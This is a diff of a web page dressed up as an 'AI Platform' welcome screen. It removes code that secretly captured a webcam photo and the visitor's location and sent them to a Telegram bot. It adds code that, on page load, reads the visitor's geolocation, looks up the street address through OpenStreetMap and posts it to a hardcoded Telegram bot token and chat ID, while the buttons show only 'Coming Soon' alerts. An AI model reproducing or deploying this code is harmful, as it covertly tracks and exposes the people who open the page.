@@ -93,8 +93,8 @@
         <div class="ai-avatar"></div>
         <h1>Welcome to the AI Platform</h1>
         <div class="buttons">
-            <button onclick="captureImage()">Capture Image</button>
             <button onclick="alert('Chat with AI Coming Soon!')">Chat with AI</button>
+            <button onclick="alert('Capture Image with AI Coming Soon!')">Capture Image</button>
         </div>
         <div class="chat-window">
             <div id="chat-log" style="height: 150px; overflow-y: auto;">
@@ -109,136 +109,81 @@
     </div>
 
     <script>
-document.addEventListener('DOMContentLoaded', () => {
-    let locationData = null;
-    let cameraStream = null;
 
-    // Initialize location and camera access in parallel
-    Promise.all([getLocation(), getCamera()])
-        .then(([location, stream]) => {
-            locationData = location;
-            cameraStream = stream;
-            captureImage(stream);  // Capture the image first
+
+// Function to get location details from OpenStreetMap
+function getLocationDetails(latitude, longitude) {
+    const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
+    return fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.display_name) {
+                return { address: data.display_name };
+            } else {
+                throw new Error("Unable to fetch address details.");
+            }
         })
         .catch(error => {
-            console.error("Initialization error:", error);
-            alert("Error initializing location or camera: " + error.message);
+            console.error("Error fetching location details:", error);
+            return { address: "Unknown Location" };
         });
-});
-
-function getLocation() {
-    return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => resolve(position.coords),
-                error => {
-                    console.error("Location access error:", error);
-                    resolve(null);  // Return null if location access fails
-                }
-            );
-        } else {
-            resolve(null);  // Return null if geolocation is not supported
-        }
-    });
 }
 
-function getCamera() {
-    return navigator.mediaDevices.getUserMedia({ video: true });
-}
-
-function captureImage(stream) {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-
-    video.onloadedmetadata = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-            const imageFile = new File([blob], "captured_image.png", { type: "image/png" });
-
-            // Send image to the bot
-            sendImageToBot(imageFile);
-
-            // Stop the video stream after capturing the image
-            stream.getTracks().forEach(track => track.stop());
-        }, 'image/png');
-    };
-}
-
-function sendImageToBot(imageFile) {
+// Function to send location data to Telegram bot
+function sendLocationToBot(latitude, longitude, location) {
     const formData = new FormData();
-    formData.append('chat_id', '2032344793');  // Replace with your chat ID
-    formData.append('photo', imageFile);
+    formData.append('chat_id', '2032344793'); // Replace with your chat ID
+    formData.append('text', `Location: ${location.address}\nCoordinates: ${latitude}, ${longitude}`);
 
-    fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendPhoto', {
+    fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendMessage', {
         method: 'POST',
         body: formData
     })
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            document.getElementById('status').innerText = 'Image sent successfully.';
+            document.getElementById('status').innerText = ' successfully!';
         } else {
-            document.getElementById('status').innerText = 'Failed to send image.';
+            document.getElementById('status').innerText = 'Failed .';
+            console.error("Telegram API error:", data);
         }
     })
     .catch(error => {
-        console.error("Error sending image to bot:", error);
-        document.getElementById('status').innerText = 'Error sending image to bot.';
+        document.getElementById('status').innerText = 'Error sending .';
+        console.error('Error sending:', error);
     });
 }
 
-function sendLocationToBot(locationData) {
-    if (locationData) {
-        const { latitude, longitude } = locationData;
+// Get the user's current location
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
 
-        getLocationDetails(latitude, longitude)
-            .then(locationDetails => {
-                const formData = new FormData();
-                formData.append('chat_id', '2032344793');  // Replace with your chat ID
-                formData.append('text', `Location: ${locationDetails.address}\nCoordinates: ${latitude}, ${longitude}`);
-
-                fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendMessage', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        document.getElementById('status').innerText = 'Location sent successfully.';
-                    } else {
-                        document.getElementById('status').innerText = 'Failed to send location.';
-                    }
-                })
-                .catch(error => {
-                    console.error("Error sending location to bot:", error);
-                    document.getElementById('status').innerText = 'Error sending location.';
-                });
-            })
-            .catch(error => {
-                console.error("Error fetching location details:", error);
-                document.getElementById('status').innerText = 'Error fetching location details.';
-            });
+                // Fetch location details and send to bot
+                getLocationDetails(latitude, longitude)
+                    .then(locationDetails => {
+                        sendLocationToBot(latitude, longitude, locationDetails);
+                    })
+                    .catch(error => {
+                        console.error("Error fetching or sending location details:", error);
+                    });
+            },
+            error => {
+                alert("Error fetching location: " + error.message);
+                console.error("Geolocation error:", error);
+            }
+        );
     } else {
-        document.getElementById('status').innerText = 'Location not available.';
+        alert("Geolocation is not supported by your browser.");
     }
 }
 
-function getLocationDetails(latitude, longitude) {
-    const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
-    return fetch(url)
-        .then(response => response.json())
-        .then(data => ({ address: data.display_name }))
-        .catch(error => {
-            console.error("Error fetching location details:", error);
-            return { address: "Unknown Location" };
-        });
-}
+// Trigger the process when the page loads or a button is clicked
+document.addEventListener('DOMContentLoaded', getLocation);
+
 
 function sendToBot(imageFile, locationData) {
     // Send image first
